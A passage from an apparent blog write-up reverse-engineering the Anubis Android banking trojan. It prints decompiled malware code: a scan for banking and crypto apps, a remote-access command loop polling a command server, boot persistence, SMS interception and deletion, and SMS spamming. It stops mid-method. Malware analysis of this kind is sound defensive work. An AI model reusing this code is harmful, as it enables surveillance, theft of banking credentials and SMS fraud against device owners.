sa::[sr]укључите::[si]ඇතුළත්::[sk]patrí::[sl]vključujejo::[sw]ni pamoja na::[su]antarana::[tl]isama::[tg]даргиронидани::[th]รวม::[ta]அடங்கும்::[tt]кертергә::[te]ఉన్నాయి.::[tr]dahil::[udm]гожтыны::[uz]o'z ichiga oladi::[uk]включити::[ur]شامل ہیں::[fi]sisältää::[fr]activer::[hi]शामिल हैं::[hr]uključiti::[cs]zahrnout::[sv]inkluderar::[gd]gabhail a-steach::[eo]inkluzivas::[et]sisse::[jv]kalebu::[ja]など".split("::");

    /* renamed from: o */
    public static final String[] f328o = ":[az]indi başlamaq::[sq]filloni tani::[am]አዳዲስ::[en]start now::[ar]تبدأ الآن::[hy]հիմա սկսել::[af]nou begin::[eu]orain hasi::[ba]хәҙер башланы.::[be]пачаць цяпер::[bn]এখন শুরু::[my]ယခုစတင်::[bg]започнете сега,::[bs]sada početi::[cy]ddechrau yn awr::[hu]indítás most::[vi]bắt đầu ngay bây giờ::[ht]kòmanse kounye a::[gl]comezar agora::[nl]start nu::[mrj]кӹзӹт тӹнгӓлӹн.::[el]να αρχίσει τώρα::[ka]დაწყება ახლავე::[gu]હવે શરૂ કરો::[da]start nu::[he]להתחיל עכשיו::[yi]אָנהייב איצט::[id]mulai sekarang::[ga]tús a chur anois::[is]byrjar nú::[es]empezar ahora::[it]iniziare ora::[kk]қазір бастау керек::[kn]ಈಗ ಪ್ರಾರಂಭಿಸಿ::[ca]comença ara::[ky]азыр баштоо::[zh]从现在开始::[ko]지금 시작::[xh]qala ngoku::[km]ចាប់ផ្តើមឥឡូវនេះ::[lo]ເລີ່ມຕົ້ນການປັດຈຸບັນ::[la]tincidunt nunc::[lv]sākt tagad::[lt]pradėti dabar::[lb]elo lass::[mk]почнете сега::[mg]manomboka izao::[ms]mulai sekarang::[ml]start now::[mt]ibda issa::[mi]tīmata i teie nei::[mr]आता प्रारंभ करा::[mhr]кызыт тӱҥалын::[mn]одоо эхлэх::[de]starten Sie jetzt::[ne]अब सुरु::[no]start nå::[pa]ਹੁਣ ਸ਼ੁਰੂ::[pap]kuminsá awor::[fa]در حال حاضر شروع::[pl]zacząć teraz::[pt]começar agora::[ro]începe acum::[ru]начать сейчас::[ceb]sugdi karon::[sr]почети сада::[si]දැන් ආරම්භ::[sk]začnite teraz::[sl]začni zdaj::[sw]kuanza sasa::[su]ngamimitian ayeuna::[tl]simulan ngayon::[tg]оғоз ҳоло::[th]เริ่มตอนนี้::[ta]இப்போது தொடங்க::[tt]башларга хәзер::[te]start now::[tr]şimdi başlayın::[udm]али кутскемын::[uz]hozir boshlash::[uk]почати зараз::[ur]اب شروع::[fi]aloita nyt::[fr]commencer dès maintenant::[hi]अब शुरू करो::[hr]započnite sada::[cs]začněte hned::[sv]börja nu::[gd]tòisich air a-nis::[eo]komenci nun::[et]alusta kohe::[jv]miwiti saiki::[ja]始めないといけない:".split("::");

    /* renamed from: p */
    public static final String[] f329p = ":[az]başlamaq::[sq]për të filluar::[am]ጋር::[en]to start::[ar]لبدء::[hy]սկսել::[af]om te begin::[eu]hasteko::[ba]башлана::[be]пачаць::[bn]শুরু করার জন্য::[my]စတင်::[bg]започнете::[bs]da počnem::[cy]i ddechrau::[hu]kezdeni::[vi]để bắt đầu::[ht]pou yo kòmanse::[gl]para comezar::[nl]om te beginnen::[mrj]тӹнгӓльӹ::[el]ξεκινήσετε::[ka]უნდა დაიწყოს::[gu]શરૂ કરવા માટે::[da]til at starte::[he]כדי להתחיל::[yi]צו אָנהייבן::[id]untuk memulai::[ga]chun tús a chur::[is]til að byrja::[es]empezar::[it]iniziare::[kk]бастау::[kn]ಆರಂಭಿಸಲು::[ca]per començar::[ky]баштоо::[zh]开始::[ko]을 시작::[xh]ukuqala::[km]ដើម្បីចាប់ផ្តើម::[lo]ເພື່ອເລີ່ມຕົ້ນ::[la]ad satus::[lv]sākt::[lt]pradėti::[lb]starten::[mk]за да започнете::[mg]manomboka::[ms]untuk memulakan::[ml]ആരംഭിക്കുക::[mt]biex tibda::[mi]ki te tīmata::[mr]सुरू करण्यासाठी::[mhr]тӱҥалына::[mn]эхлэх::[de]starten::[ne]सुरु गर्न::[no]for å starte::[pa]ਸ਼ੁਰੂ ਕਰਨ ਲਈ::[pap]kuminsá::[fa]برای شروع::[pl]zacząć::[pt]começar::[ro]începe::[ru]начать::[ceb]sa pagsugod::[sr]почетак::[si]ආරම්භ කිරීමට::[sk]na začiatok::[sl]za začetek::[sw]kuanza::[su]pikeun ngamimitian::[tl]upang simulan ang::[tg]post оянда::[th]ต้องเริ่มต้น::[ta]தொடங்க::[tt]башлау::[te]ప్రారంభం::[tr]başlamak::[udm]кутскиз::[uz]boshlash uchun ::[uk]почати::[ur]شروع کرنے کے لئے::[fi]aloittaa::[fr]commencer::[hi]शुरू करने के लिए::[hr]početak::[cs]začít::[sv]för att börja::[gd]tòiseachadh::[eo]al komenco::[et]alustada::[jv]kanggo miwiti::[ja]を開始:".split("::");

    /* renamed from: q */
    public static final String[] f330q = ":[az]Sistem işləyir səhv ayırın ::[sq]Sistemi nuk funksionon në mënyrë korrekte, të çaktivizoni ::[am]አዳዲስ ግምገማዎች በትክክል አንድ ::[en]The system does not work correctly, disable ::[ar]النظام لا يعمل بشكل صحيح ، تعطيل ::[hy]Համակարգը աշխատում է, սխալ է, անջատեք ::[af]Die stelsel nie werk nie korrek nie, skakel ::[eu]Sistema ez da behar bezala lan, desgaitu ::[ba]Системалары дөрөҫ эшләргә,  һүндерелә::[be]Сістэма працуе няправільна, адключыце ::[bn]সিস্টেম কাজ করে না, সঠিকভাবে নিষ্ক্রিয় ::[my]အဆိုပါစနစ်ကအလုပ်မလုပ်ပါဘူး၊မှန်မှန်ကန်ကန်ပိတ် ၁၂၃၁၂၃::[bg]Системата работи правилно, изключете ::[bs]Sistem ne radi ispravno, onesposobiti ::[cy]Nid yw'r system yn gweithio yn gywir, analluogi ::[hu]A rendszer nem működik megfelelően, tiltsa le ::[vi]Hệ thống không hoạt động chính xác, vô hiệu hóa ::[ht]Sistèm nan pa travay kòrèkteman, enfim ::[gl]O sistema non funciona correctamente, desactivar ::[nl]Het systeem werkt niet goed, uitschakelen ::[mrj]Самынь системӹм ӹштӹмӓш, отключать ::[el]Το σύστημα δεν λειτουργεί σωστά, απενεργοποιήστε ::[ka]სისტემა არ მუშაობს სწორად, გამორთოთ ::[gu]આ સિસ્ટમ યોગ્ય રીતે કામ કરતી નથી, નિષ્ક્રિય ::[da]Systemet ikke fungerer korrekt, skal du deaktivere ::[he]המערכת לא עובדת כראוי, השבת ::[yi]די סיסטעם טוט ניט אַרבעט ריכטיק, דיסייבאַל ::[id]Sistem tidak bekerja dengan benar, menonaktifkan ::[ga]Ní dhéanann an córas ag obair i gceart, a dhíchumasú ::[is]Kerfið virkar ekki rétt, slökkva ::[es]El sistema no funciona correctamente, deshabilitar ::[it]Il sistema non funziona correttamente, disattivare ::[kk]Жүйесі дұрыс жұмыс істемейді, өшіріңіз ::[kn]ವ್ಯವಸ್ಥೆ ಸರಿಯಾಗಿ ಕೆಲಸ ಮಾಡುವುದಿಲ್ಲ, ನಿಷ್ಕ್ರಿಯಗೊಳಿಸಲು ::[ca]El sistema no funciona correctament, inutilitzar en ::[ky]Тутум туура эмес, отключите ::[zh]该系统不能正常工作，禁止::[ko]이 체계가 제대로 작동하지 않으면 비활성화 ::[xh]Inkqubo kubancedisi ngokuchanekileyo, khubaza ::[km]ប្រព័ន្ធនេះមិនបានធ្វើការយ៉ាងត្រឹមបិទ ១២៣១២៣::[lo]ລະບົບບໍ່ໄດ້ເຮັດວຽກຢ່າງຖືກຕ້ອງ,ປິດການໃຊ້ ໑໒໓໑໒໓::[la]Ratio non opus est, ut recte, disable ::[lv]Sistēma nedarbojas pareizi, atslēgt ::[lt]Sistema neveikia tinkamai, išjunkite ::[lb]D ' system net ordnungsgemäß fonctionnéiert, deaktivieren Si ::[mk]Системот не работи правилно, исклучете ::[mg]Ny rafitra dia tsy miasa araka ny tokony ho izy, mankarary ::[ms]Sistem tidak bekerja dengan betul, melumpuhkan ::[ml]The system does not work correctly, അപ്രാപ്തമാക്കുക ::[mt]Is-sistema ma taħdimx kif suppost, iwaqqaf ::[mi]Ko te pūnaha e kore e mahi i te tika, mono i ::[mr]प्रणाली कार्य करत नाही योग्य अक्षम ::[mhr]Йоҥылыш система пашам ышта, пыштышым ::[mn]Систем ажиллахгүй зөв, идэвхгүй ::[de]Das system nicht ordnungsgemäß funktioniert, deaktivieren Sie ::[ne]The system does not work correctly, अक्षम ::[no]Systemet ikke fungerer på riktig måte, må du deaktivere ::[pa]ਸਿਸਟਮ ਨੂੰ ਕੰਮ ਨਹੀ ਕਰਦਾ ਹੈ, ਠੀਕ ਅਯੋਗ ::[pap]E sistema no ta funciona directamente, desabilidat ::[fa]این سیستم به درستی کار نمی کند با غیر فعال کردن ::[pl]System nie działa prawidłowo, wyłącz ::[pt]O sistema não funcionar corretamente, desative ::[ro]Sistemul nu funcționează corect, dezactiva ::[ru]Система работает неправильно, отключите ::[ceb]Ang sistema sa dili pagtrabaho sa husto nga paagi, nga naghimo og kakulangan sa ::[sr]Систем ради у реду, искључите ::[si]මෙම ක්රමය වැඩ කරන්නේ නැහැ, නිවැරදිව, අක්රීය ::[sk]Systém nefunguje správne, vypnite ::[sl]Sistem ne deluje pravilno, se onemogoči ::[sw]Mfumo haifanyi kazi kwa usahihi, afya ::[su]Sistim teu digawé bener, pareuman ::[tl]Ang sistema ay hindi gumagana nang tama, huwag paganahin ang ::[tg]Системаи кор нодуруст аст, отключите ::[th]ระบบจะไม่ทำงานอย่างถูกต้อปิดการใช้งาน ::[ta]கணினி சரியாக வேலை செய்யாது, முடக்க ::[tt]Система эшли дөрес түгел, отключите ::[te]The system does not work correctly, డిసేబుల్ ::[tr]Sistem düzgün çalışmıyor, devre dışı ::[udm]Неправильно системая ужа, disconnect ::[uz]Tizimi to'g'ri, o'chirish  ishlamaydi ::[uk]Система працює неправильно, вимкніть ::[ur]نظام کام نہیں کرتا ہے ، درست طریقے سے غیر فعال ::[fi]Järjestelmä ei toimi oikein, poista ::[fr]Le système ne fonctionne pas correctement, désactivez ::[hi]सिस्टम ठीक से काम नहीं करता है, निष्क्रिय ::[hr]Sustav radi ispravno, isključite ::[cs]Systém nemusí pracovat správně, zakažte ::[sv]Systemet inte fungerar korrekt, inaktivera ::[gd]Tha an siostam a ' dèanamh nach eil ag obair mar bu chòir, cuir seo à comas ::[eo]La sistemo ne funkcias korekte, malebligi ::[et]Süsteem ei tööta nõuetekohaselt, lülitage välja ::[jv]Sistem ora bisa bener, mateni ::[ja]システムの攻撃により正常に動作しなくなったり、無効に:".split("::");

    /* renamed from: r */
    public static final String[] f331r = ":[az]Продождить::[sq]Për protoedit::[am]ጋር protoedit::[en]Сontinue::[ar]إلى protoedit::[hy]Продождить::[af]Om te protoedit::[eu]Nahi protoedit::[ba]Продождить::[be]Продождить::[bn]করতে protoedit::[my]အ protoedit::[bg]Продождить::[bs]Da protoedit::[cy]I protoedit::[hu]Hogy protoedit::[vi]Để protoedit::[ht]Pou protoedit::[gl]Para protoedit::[nl]Om protoedit::[mrj]Продождить::[el]Продождить::[ka]უნდა protoedit::[gu]માટે protoedit::[da]At protoedit::[he]כדי protoedit::[yi]צו protoedit::[id]Untuk protoedit::[ga]A protoedit::[is]Að protoedit::[es]Продождить::[it]Продождить::[kk]Продождить::[kn]ಗೆ protoedit::[ca]Сontinue::[ky]Продождить::[zh]到protoedit::[ko]을 protoedit::[xh]Ukuba protoedit::[km]ដើម្បី protoedit::[lo]ການ protoedit::[la]Ad protoedit::[lv]Продождить::[lt]Продождить::[lb]Продождить::[mk]Да protoedit::[mg]Mba protoedit::[ms]Untuk protoedit::[ml]To protoedit::[mt]Biex protoedit::[mi]Ki te protoedit::[mr]To protoedit::[mhr]Продождить::[mn]To protoedit::[de]Продождить::[ne]गर्न protoedit::[no]For å protoedit::[pa]ਕਰਨ ਲਈ protoedit::[pap]Продождить::[fa]به protoedit::[pl]Продождить::[pt]Продождить::[ro]Продождить::[ru]Продождить::[ceb]Sa protoedit::[sr]Продождить::[si]කිරීමට protoedit::[sk]Na protoedit::[sl]Za protoedit::[sw]Kwa protoedit::[su]Pikeun protoedit::[tl]Sa protoedit::[tg]Продождить::[th]ต้อง protoedit::[ta]To protoedit::[tt]Продождить::[te]కు protoedit::[tr]Продождить::[udm]Продождить::[uz]Uchun protoedit::[uk]Продождить::[ur]کرنے کے لئے protoedit::[fi]Voit protoedit::[fr]Продождить::[hi]करने के लिए protoedit::[hr]Продождить::[cs]Продождить::[sv]Att protoedit::[gd]Gu protoedit::[eo]Al protoedit::[et]Продождить::[jv]Kanggo protoedit::[ja]にprotoedit:".split("::");

```

here, we can see some random bullshit strings, in various languages and each assigned to a string array. 

little below that, another two string arrays are declared, both size equal to `62`, and the first one is assigned with each letter of the english alphebet + some characters and the the other is assigned with the chinese alphebet (i dont know if there's chinese alphebet).

```java
public String[] permissions = {"android.permission.SEND_SMS", "android.permission.WRITE_EXTERNAL_STORAGE", "android.permission.READ_CONTACTS", "android.permission.ACCESS_FINE_LOCATION", "android.permission.CALL_PHONE", "android.permission.RECORD_AUDIO"};
```

then there is this string array (which, i renamed) specifying the permissions reqested by the apk.

```java 

    public String mo206a(Context context) {
        String str = "";
        for (ApplicationInfo applicationInfo : context.getPackageManager().getInstalledApplications(128)) {
            if (applicationInfo.packageName.equals("at.spardat.bcrmobile")) {
                str = str + "at.spardat.bcrmobile,";
            }
            if (applicationInfo.packageName.equals("at.spardat.netbanking")) {
                str = str + "at.spardat.netbanking,";
            }
            if (applicationInfo.packageName.equals("com.bankaustria.android.olb")) {
                str = str + "com.bankaustria.android.olb,";
            }
            
            [... shit tons of stuff more]

            if (applicationInfo.packageName.equals("com.kryptokit.jaxx")) {
                str = str + "com.kryptokit.jaxx(Crypt),";
            }
        }
        if (str.contains("com.paypal.android.p2pmobile,")) {
            str = str.replace("com.paypal.android.p2pmobile,", "") + "com.paypal.android.p2pmobile,";
        }
        if (str.contains("com.amazon.mShop.android.shopping,")) {
            str = str.replace("com.amazon.mShop.android.shopping,", "") + "com.amazon.mShop.android.shopping,";
        }
        if (!str.contains("com.ebay.mobile,")) {
            return str;
        }
        return str.replace("com.ebay.mobile,", "") + "com.ebay.mobile,";
    }
```
at the top, the method declares string `str` and initliaze it to an empty string. then it iterates through each installed application and compares the application�s name with a shit ton of string, which are basically names of banking apps. if the current application�s name is equal to one of those strings, string `str` is appended with the name followed by a comma.

when the iteration is finished, it checks if `str` contains following names.


    - com.paypal.android.p2pmobile
    - com.amazon.mShop.android.shopping
    - com.ebay.mobile

if it does, it replaces the name with an empty string and append the name to the end of `str`.


### Remote Access

We already know anubis has RAT capabilities. And those features are implemented in the below class.

```java
/* renamed from: wocwvy.czyxoxmbauu.slsa.xelytgswelv */
public class RAT extends IntentService {

    /* renamed from: a */
    String str = "";

    /* renamed from: b */
    SomeHttpClass cls = new SomeHttpClass();

    /* renamed from: c */
    Constants consts = new Constants();

    /* renamed from: d */
    HttpConn conn = new HttpConn();

    /* renamed from: e */
    BankingApps banking_apps = new BankingApps();

    public RAT() {
        super("xelytgswelv");
    }
```

here it initializes some objects. Interesting part begins in the `onHandleIntent` 
Since this is an IntentService, onHandleIntent is the first method that will get executed. quoting android api reference

**"This method is invoked on the worker thread with a request to process. Only one Intent is processed at a time, but the processing happens on a worker thread that runs independently from other application logic"**

```java

    public void onHandleIntent(Intent intent) {

        [... more code]

        this.str = this.cls.GetSSAID(this).replace(" ", "");

        [... more code]
```

`str` is assigned to `SomeHttpClass.GetSSAID` but with spaces are strippd off.

```java
        while (true) {
            TimeUnit.MILLISECONDS.sleep(1000);
            String e = this.cls.GetSharedPreference(this, "websocket");
```

then a inside an infinite loop, it sleeps for 1000 miliseconds and assign string `e` with shared preference `websocket`.

```java
            if (!e.equals("")) {
                HttpConn bVar3 = this.conn;
                StringBuilder sb = new StringBuilder();
                sb.append(e);
                this.consts.getClass();
                sb.append("/o1o/a2.php");
                String sb2 = sb.toString();
                StringBuilder sb3 = new StringBuilder();
                sb3.append("tuk_tuk=");
                sb3.append(this.cls.Encode(this.str + "|:| "));
                String d = this.cls.DecodeAndDecrypt(bVar3.PostRequest(sb2, sb3.toString()));
                this.cls.mo213a("RATresponce", "" + d);
```

if `e` is not an empty string, it then creates a string builder and append `e` to it and in the next line it appends `"/o1o/a2.php"` to it. Since we have previously encountered `websocket`, we know its the domain name/ip address of the server.

In the next few lines, it is pretty clear that method is creating POST request to a url using the string builder `sb`. it is then assigned to the string `sb2` and another string builder named `sb3` is created. I beleive this is what `PostRequest` implemented in `HttpConn` class writes to the **output stream of the http connection**.  

then the returning response of the request is base64 decoded and decrypted and assigned to string `d`.

```java
                if (d != "**") {
                    if (d.contains("opendir:")) {
                        String str6 = d.replace("opendir:", "").split("!!!!")[0];
                        if (str6.contains("getExternalStorageDirectory")) {
                            str6 = Environment.getExternalStorageDirectory().getAbsolutePath();
                        }

                        [... more code]

                    } else if (d.contains("downloadfile:")) {
                        String str7 = d.replace("downloadfile:", "").split("!!!!")[0];
                        this.cls.mo213a("file", str7);

                        [... more code]

                    } else if (d.contains("deletefilefolder:")) {
                        File file = new File(d.replace("deletefilefolder:", "").split("!!!!")[0]);
                        file.delete();

                        [... more code]

                    } else if (!d.contains("startscreenVNC")) {
                        
                        [... more code; look below]
                        

                    } 
                    // if d.contains("startscreenVNC") == true
                    else if (!this.cls.IsRunning(this, IntentServiceC0104x3750d9a6.class)) {
                        
                        [... more code]

                    }
                    bVar.mo213a(str2, str);
                }
```
first it makes sure `d` is not equal to `"**"`, which might be a termination command.
In the next few lines of the method, it checks whether if response string contains various commands such as,

    - opendir
    - downloadfile
    - deletefilefolder
    - startscreenVNC

These must be the remote access commands that malware uses.

However there are many other commands under mentioned inside the else if block that checks if `d` does not contain string `"startscreenVNC"`.

```java
                        if (d.contains("stopscreenVNC")) {
                            bVar2 = this.cls;
                            str3 = "vnc";
                        } else {
                            if (d.contains("startsound")) {
                                if (this.cls.mo229c(this, this.banking_apps.record_audio_permission[0])) {
                                    
                                    [... more code]

                                }
                            } else if (d.contains("startforegroundsound")) {
                                if (this.cls.mo229c(this, this.banking_apps.record_audio_permission[0])) {
                                    
                                    [... more code]
                                }
                            } else if (d.contains("stopsound")) {
                                bVar2 = this.cls;
                                str3 = "sound";

                            } else if (d.contains("**noconnection**")) {
                                this.cls.SetSharedPreference(this, "websocket", "");
                                this.cls.SetSharedPreference(this, "vnc", "stop");
                                this.cls.SetSharedPreference(this, "sound", "stop");
                                stopService(intent);
                            }
                            startService(intent2.putExtra(str4, str5));
                        }
                        bVar2.SetSharedPreference(this, str3, "stop");
```

As we saw earlier it checks if `d` does not contain the string `"startscreenVNC"`. if true, it checks if `d` contains following strings, which are essentially, RAT commands

    - stopscreenVNC
    - startsound
    - startforegroundsound
    - stopsound
    - **noconnection**

what each of these (as well as the previous ones) commands does is pretty much clear. Since we have already analyzed audio recording functions, it is clear that `startsound` and `startforegroundsound` are the commands that invoke those functions (by setting shared preference `"sound"` to `start`,`start foreground`) and `stopsound` is the one that stops recording (by setting `"sound"` to `stop`).

if the response string contains `**noconnection**` in it,  if so, it sets following shared preferences

    - websocket -> ""
    - vnc -> "stop"
    - sound -> "stop"

and stops the service. it also sets whatever shared preference at `str3` to `"stop"`, and `str3` should be either `"vnc"` or `"sound"`.
It seems like after diconnecting with the attacker, it resets all the associated shared preferences.

**Until now, we have analyzed core features of the anubus banking trojan. Now it is time to take a look at some other features mentioned in the shared preference xml and manifest xml.**

### Achieving Persistence and User Presence

When we were analyzing the manifest xml file, we came across a broadcast receiver that listens for BOOT_COMPLETE. Let's take a look at that class.

```java

/* renamed to EventListener */
public class EventListener extends BroadcastReceiver {

    /* renamed from: a */
    SomeHttpClass cls = new SomeHttpClass();

    [... more code]
}
```

it has only one member variable, that of `SomeHttpClass`.

```java
    public void mo443a(Context context, Intent intent) {
        String action = intent.getAction();
        context.startService(new Intent(context, Service1.class));
        SomeHttpClass cls1 = this.cls;
        cls1.mo213a("Action", "BOOT Start " + action);

        [... more code]
    }
```

First method of this class accepts two arguments, one being of class `Context` and the other being of class `Intent`.
In the next few lines, it retrieves the action that called this method using `intent.getAction()`, stores it in `String action` and starts a new service `Service1`, which we reversed ealier.

```java
        try {
            SomeHttpClass bVar2 = this.cls;
            SomeHttpClass.StartAlarm(context, "startAlarm", (long) Integer.parseInt(this.cls.GetSharedPreference(context, "Interval")));
        } catch (Exception unused) {
            SomeHttpClass bVar3 = this.cls;
            SomeHttpClass.StartAlarm(context, "startAlarm", 15000);
        }
```

inside the try block, just like in the MainActivity, it tries to start an alarm. if it fails, it uses a default value of `15000` to start the alarm.
Since we have already identified that the return value of `GetSharedPreferences(context, "Interval")` is 10000, this time we can think of some difference in the alarm time, compared to our previous encounter with the `Interval` key.

```java
        if (action.equals("android.intent.action.USER_PRESENT")) {
            context.startService(new Intent(context, IntentServiceC0110x9cb6f428.class));
        }

        if (action.equals("android.provider.Telephony.SMS_RECEIVED") && this.cls.GetSharedPreference(context, "perehvat_sws").contains("true")) {
            mo444b(context, intent);
        }
    }
```

next few lines check whether if the action string is equal to `"android.intent.action.USER_PRESENT"`, if so, it starts another service.

### SMS Sending, Receiving and Spamming

`EventListener.mo443a` also checks whether the action is equal to `"android.intent.action.SMS_RECEIVED"` and value for shared preference key `perehvat_sws` 
is equal to to true. if so, it calls another method. Since it is clear that `mo443a` method is essentially listening for incoming messages, this could be the one that process and convert it into a content.

```java
public void mo444b(Context context, Intent intent) {
        Bundle extras = intent.getExtras();
```

it takes two parameters, a `Context` and `Intent`. then it initializes a variable of class `Bundle` with `intent.getExtras()`. We saw 
earlier that `mo443a` calls this method by passing the same values that it receives as arguments. as everyones knows an intent is a way to switch between activities, `getExtras` is a way to retrieve values stored in a `Bundle`. so this is basically a way to pass stuff betweeen intents.

```java
        if (extras != null) {
            try {
                Object[] objArr = (Object[]) extras.get("pdus");
                String str = "";
                String str2 = "";
```

in the next few lines, it checks whether the variable of type `Bundle` is not equals to null. A Bundle is a if the evaluation turns out to be true, it does some work inside the try block. 

inside the block, it creates and initializes an `Object` array named `objArr`, and call `extras.get("pdus")` on it to retrieve values for key `pdus`. (A PDU (payload data unit) which contains information regarding a SMS)

it also declares two string empty strings.

```java
                if (objArr != null) {
                    int length = objArr.length;
                    int i = 0;
```

then it checks whether if Object array it created earlier is not null, if true, it initializes a variable of int named `length` with
`objArr.length`.


```java
                    while (i < length) {
                        SmsMessage createFromPdu = SmsMessage.createFromPdu((byte[]) objArr[i]);
                        String displayOriginatingAddress = createFromPdu.getDisplayOriginatingAddress();
                        String displayMessageBody = createFromPdu.getDisplayMessageBody();
                        str2 = str2 + displayMessageBody;
                        context.startService(new Intent(context, whemsbk.class).putExtra("num", displayOriginatingAddress).putExtra("ms", displayMessageBody));
                        i++;
                        str = displayOriginatingAddress;
                    }
```

then it loops through the object array, and for each object in the array, it creates an object named `createFromPdu` that of class `SmsMessage` by calling `SmsMessage.createFromPdu`, 
variables `displayOriginatingAddress`, `displayMessageBody` is assigned to `createFromPdu.getDisplayOriginatingAddress()` and `createFromPdu.getDisplayMessageBody()` respectively. And, `displayMessageBody` is appended to `str2`. in the next line, it starts another
service.

So in summery what this method does is, it retrieves every SMS that has been received using the `intent` passed to it by the method that calls it, interate through each and every one of them, parse the SMS to a SmsMessag object using `createFromPdu` method, and start a service passing the originating address and SMS content through the intent after parsing those information. 

Let's take a look at the new service.

```java
public class whemsbk extends Service {

    [... more code]

    private void m487c(Context context, String str, String str2) {

            [... more code]

            Uri parse = Uri.parse("content://sms/inbox");
            Cursor query = context.getContentResolver().query(parse, new String[]{"_id", "thread_id", "address", "person", "date", "body"}, null, null, null);
            if (query != null && query.moveToFirst()) {
                do {
                    long j = query.getLong(0);
                    query.getLong(1);
                    String string = query.getString(2);
                    if (!str.equals(query.getString(5)) && string.equals(str2)) {
                        ContentResolver contentResolver = context.getContentResolver();
                        contentResolver.delete(Uri.parse("content://sms/" + j), null, null);
                    }
                } while (query.moveToNext());
            }
```

Basically, above method retrieves **id**, **thread_id**, **address**, **person**, **date**, and **body**. from `content://sms/inbox` using a ContentResolver. So with that, we can conclude that this method is parsing the contents of the SMS.

Using the android manifest file, we have identified few classes that are responsible for messing with sending SMS.

let's start with `wocwvy.czyxoxmbauu.slsa.lmily`.  

```java
package wocwvy.czyxoxmbauu.slsa;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;

public class lmimy extends Service {
    public IBinder onBind(Intent intent) {
        return null;
    }
}
```

this looks sus. There's nothing important here. Maybe the malware author is trying to distract us with false information.

But if we search for string `SMS`, we can find an IntentService (an IntentService is a service that handles asynchronous requests) that I think is in chaarge for SMS spamming.

```java
/* renamed from wifu */
public class SMSSpam extends IntentService {

    /* renamed from: a */
    SomeHttpClass cls = new SomeHttpClass();

    /* renamed from: b */
    String str = "";

    /* renamed from: c */
    String name = "wifu";

    public SMSSpam() {
        super("wifu");
    }

    public void onHandleIntent(Intent intent) {
        while (true) {
            try {
                TimeUnit.MILLISECONDS.sleep(10000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
```

it looks like the method tries to sleep for 10000 miliseconds inside an infinite loop. if it fails, it prints the stack trace.

```java
            if (this.cls.GetSharedPreference(this, "spamSMS").equals("start")) {
                if (!this.cls.IsRunning(this, dshd.class)) {
                    if (this.str.length() > 3) {
                        this.str = "sendsms" + this.str;
                    }
```

then it checks the value for shared preference key `spamSMS` is equal to `start`. 

and if the check turns out to be true, if shared preference `spamSMS` results in `start`, it checks whether if a service named `dshd` is running, if not and if length of `str` is geater than 3, it appends `"sendsms"` to `str`.

```java
                    if (this.cls.GetSharedPreference(this, "indexSMSSPAM").contains("|||||")) {
                        this.cls.SetSharedPreference(this, "spamSMS", "");
                        SomeHttpClass bVar = this.cls;
                        StringBuilder sb = new StringBuilder();
                        sb.append("p=");
                        sb.append(this.cls.Encode(this.cls.GetSSAID(this) + "|Ended balance, SMS spam stopped!|"));
                        bVar.exfiltrate(this, "4", sb.toString());
                    }
```

in the next line it checks if `GetSharedPreference("indexSMSSPAM")` returns a stirng with `|||||`, if true, it sets shared preference value `spamSMS` to an empty string using `SetSharedPreference`.

then it creates a string builder and appends it with strings `"p="`, base64 encoded SSAID of the device and `"|Ended balance, SMS spam stopped!|"`. Then it sends the string to `/o1o/a6.php`.

from that we can conclude if `GetSharedPreference("indexSMSSPAM")` results in `|||||`, it means the balance of SIM card has ended.

```java
                    SomeHttpClass bVar2 = this.cls;
                    StringBuilder sb2 = new StringBuilder();
                    sb2.append("p=");
                    sb2.append(this.cls.Encode("getnumber" + this.str));
                    String d = this.cls.DecodeAndDecrypt(bVar2.exfiltrate(this, "15", sb2.toString()));
                    String str = "";
                    String e2 = this.cls.GetSharedPreference(this, "textSPAM");
```

according to the above snippet, a string builder is created and appended with `"p="`, then it is again appended with base64 encoded 
string of "`getnumber`" and `str`.

then it is passed to `"/o1o/a15.php"`

```java
                    if (d.contains("/")) {
                        str = d.split("/")[0];
                        d = d.split("/")[1];
                        e2 = e2.replace("{nameholder}", str);
                    }
                    if (d.equals("close")) {
                        this.cls.SetSharedPreference(this, "spamSMS", "");
                        break;
                    }
```

next few lines looks crazy. first it checks whether return string of `exfiltrate`, `("/")`, if so it does some splitting and replace some strings.

in the next if statement, if checks `d` is equal to string `"close"`, if so, it sets shared preference `spamSMS` to an empty stirng.

```java
                    this.cls.mo213a(this.name, "number: " + d + "  msg: " + e2);
                    startService(new Intent(this, dshd.class).putExtra("number", d).putExtra("msg", e2));
                    if (str.length() > 2) {
                        d = str + "/" + d;
                    }
                    this.str = d;
```

at the end of the method, it calls a method from `SomeHttpClass`, then starts the service `dshd` and passes two key value pairs `("num", d)` and `("msg", e2)` through the intent.

Since this is the end of the method, I suspect service `dshd` might contain the code that waits for the SMSs and start the spam.

```java
public class dshd extends Service {

    /* renamed from: a */
    Context ctx;

    /* renamed from: b */
    SomeHttpClass cls = new SomeHttpClass();

    /* renamed from: c */
    BroadcastReceiver receiver = new BroadcastReceiver() {
        /* class wocwvy.p003x881dce2d.slsa.oyqwzkyy.p007x2753d1cd.dshd.C00951 */

        /* renamed from: onReceive */
        public void onReceive(Context context, Intent intent) {
            SomeHttpClass bVar;
            String str;
            String str2;
            if (getResultCode() != -1) {
                dshd.this.cls.mo213a("S", "Error SMS SENT");
                bVar = dshd.this.cls;
                str = "indexSMSSPAM";
                str2 = dshd.this.cls.GetSharedPreference(context, "indexSMSSPAM") + "|";
            } else {
                dshd.this.cls.mo213a("S", "SMS SENT");
                bVar = dshd.this.cls;
                str = "indexSMSSPAM";
                str2 = "";
            }
            bVar.SetSharedPreference(context, str, str2);
            dshd.this.unregisterReceiver(dshd.this.receiver);
            dshd.this.stopSelf();
        }
    };
```

as we have already guessed, it is. `onReceive` method is responsible for checking whether SMS has sent successfully or not.

```java
    /* renamed from: onStartCommand */
    public int onStartCommand(Intent intent, int i, int i2) {
        this.ctx = this;
        this.cls.SpamSMS(this, intent.getStringExtra("number"), intent.getStringExtra("msg"));
        registerReceiver(this.receiver, new IntentFilter("SMS_SENT"));
        return 2;
    }
```

SMS spam code is implemented in `onStartCommand` method. it is the method that executes once the service is started. So we can assume that as soon as the service starts, it starts sending spam SMS to the number it receives through the intent. It also retrieves contents for the SMS through the intent (we saw earlier `onHandleIntent` add those stuff to extras before starting the service).

However to send the SMS messages, it uses another method implemented in `SomeHttpClass`.

Let's take a look at that one.

```java
   public void SpamSMS(Context context, String str, String str2) {
        SmsManager smsManager = SmsManager.getDefault();
